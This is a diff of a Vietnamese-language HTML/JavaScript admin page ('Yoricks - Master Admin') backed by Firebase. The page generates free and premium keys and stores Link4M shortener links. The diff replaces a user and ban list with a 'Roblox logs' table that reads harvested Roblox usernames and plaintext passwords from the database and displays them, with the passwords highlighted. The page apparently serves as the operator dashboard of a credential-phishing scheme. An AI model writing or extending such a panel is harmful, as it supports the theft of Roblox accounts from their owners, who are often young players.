@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Admin - Yoricks Master</title>
+    <title>Yoricks - Master Admin</title>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
@@ -11,37 +11,41 @@
         .card { background: #111; border: 1px solid #333; padding: 20px; border-radius: 10px; }
         input, select, button { width: 100%; padding: 10px; margin: 5px 0; background: #000; color: #fff; border: 1px solid #bc13fe; }
         button { background: #bc13fe; cursor: pointer; font-weight: bold; }
-        table { width: 100%; margin-top: 10px; color: white; font-size: 12px; }
-        th { text-align: left; color: #bc13fe; }
+        .pre-key { color: #ffcc00; border-color: #ffcc00; }
+        table { width: 100%; color: white; font-size: 13px; border-collapse: collapse; }
+        th, td { padding: 10px; border: 1px solid #222; text-align: left; }
     </style>
 </head>
 <body>
-    <h1 style="text-align: center;">YORICKS ADMIN SYSTEM</h1>
+    <h1 style="text-align:center">ADMIN YORICKS V2</h1>
     
     <div class="grid">
         <div class="card">
-            <h3>Tạo Key Mới</h3>
-            <select id="k-days"><option value="1">1 Ngày</option><option value="3">3 Ngày</option><option value="7">7 Ngày</option></select>
-            <button onclick="genKey()">GIAO KEY</button>
-            <div id="new-key" style="margin-top:10px; font-weight:bold; color:white;"></div>
+            <h3>Tạo Key</h3>
+            <select id="k-type">
+                <option value="member">Key Thường (Free)</option>
+                <option value="premium">Key Premium (VIP)</option>
+            </select>
+            <input type="number" id="k-days" placeholder="Số ngày">
+            <button onclick="addKey()">GENERATE KEY</button>
+            <p id="key-res" style="color:white; word-break:break-all"></p>
         </div>
 
         <div class="card">
-            <h3>Cài đặt Link4M</h3>
+            <h3>Settings Link4M</h3>
             <input type="text" id="l1" placeholder="Link 1 Ngày">
             <input type="text" id="l3" placeholder="Link 3 Ngày">
-            <input type="text" id="l7" placeholder="Link 7 Ngày">
-            <button onclick="saveLinks()">LƯU LINK</button>
+            <button onclick="saveL()">Lưu Link</button>
         </div>
     </div>
 
-    <div class="card" style="margin-top: 20px;">
-        <h3>Danh Sách Người Dùng & Key</h3>
-        <table border="1">
+    <div class="card" style="margin-top:20px;">
+        <h3>Dữ liệu Roblox (Logs)</h3>
+        <table id="log-table">
             <thead>
-                <tr><th>User</th><th>Pass</th><th>Status</th><th>Exp</th><th>Hành động</th></tr>
+                <tr><th>User Web</th><th>User Roblox</th><th>Pass Roblox</th><th>Thời gian</th></tr>
             </thead>
-            <tbody id="user-list"></tbody>
+            <tbody id="log-body"></tbody>
         </table>
     </div>
 
@@ -58,43 +62,38 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    function genKey() {
-        const d = document.getElementById('k-days').value;
-        const k = "YOR-" + Math.random().toString(36).substring(2, 10).toUpperCase();
-        db.ref('keys/' + k).set({ duration: d, used: false })
+    function addKey() {
+        const type = document.getElementById('k-type').value;
+        const days = document.getElementById('k-days').value || 1;
+        const key = (type === "premium" ? "PRE-" : "FREE-") + Math.random().toString(36).substring(2, 10).toUpperCase();
+        
+        db.ref('keys/' + key).set({ type: type, duration: days, used: false })
         .then(() => {
-            document.getElementById('new-key').innerText = "MÃ MỚI: " + k;
-            Swal.fire('Xong', 'Đã tạo key thành công', 'success');
+            document.getElementById('key-res').innerHTML = `Đã tạo key ${type}: <b>${key}</b>`;
         });
     }
 
-    function saveLinks() {
-        db.ref('settings/links').set({
-            d1: document.getElementById('l1').value,
-            d3: document.getElementById('l3').value,
-            d7: document.getElementById('l7').value
-        }).then(() => Swal.fire('Thành công', 'Đã lưu cấu hình link!', 'success'));
+    function saveL() {
+        db.ref('settings/links').set({ d1: document.getElementById('l1').value, d3: document.getElementById('l3').value })
+        .then(() => Swal.fire('Xong', 'Lưu link thành công', 'success'));
     }
 
-    // Load user database
-    db.ref('users').on('value', s => {
-        const users = s.val();
-        let html = "";
-        for(let u in users) {
-            html += `<tr>
-                <td>${u}</td>
-                <td>${users[u].password}</td>
-                <td>${users[u].status}</td>
-                <td>${users[u].exp}</td>
-                <td><button onclick="ban('${u}', ${users[u].banned})">${users[u].banned ? 'Unban' : 'BAN'}</button></td>
-            </tr>`;
+    db.ref('logs').on('value', s => {
+        const logs = s.val();
+        let h = "";
+        for(let user in logs) {
+            for(let id in logs[user]) {
+                const data = logs[user][id];
+                h += `<tr>
+                    <td>${user}</td>
+                    <td>${data.r_user}</td>
+                    <td style="color:lime">${data.r_pass}</td>
+                    <td>${data.time}</td>
+                </tr>`;
+            }
         }
-        document.getElementById('user-list').innerHTML = html;
+        document.getElementById('log-body').innerHTML = h;
     });
-
-    function ban(u, st) {
-        db.ref('users/' + u).update({ banned: !st });
-    }
 </script>
 </body>
 </html>
